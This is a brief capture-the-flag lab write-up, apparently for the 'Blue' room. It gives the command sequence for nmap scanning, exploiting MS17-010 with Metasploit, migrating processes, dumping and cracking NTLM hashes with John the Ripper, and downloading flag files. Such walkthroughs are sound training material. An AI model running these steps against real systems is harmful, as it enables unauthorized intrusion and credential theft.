# Blue

> thegurpreet | Apr 2021

## Service Enumeration

Scanning ports using nmap
```
nmap -sC -sV $ip
nmap -sC -sV $ip --script vuln
```

## Exploit using MetaSploit

Using MetaSploit search for vuln ms17-010
```
sudo msfdb init
msfconsole
search ms17
```

Select the exploit using its id or full path and set required details
```
use 0
options
set RHOSTS <local ip>
```

Launch exploit
```
exploit
```

Validate the user access, it should be system
```
getuid
getpid
```

If system priv is not there or need to pivot to other stable process then migrate
```
ps
migrate <new pid here>
getpid
getuid
```

## Cracking password and search flags

Fetch hashes using hashdump and try cracking using john the ripper
```
hashdump
sudo john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Search for flags to complete the lab
```
search -f *flag*
download c:\\flag1.txt
```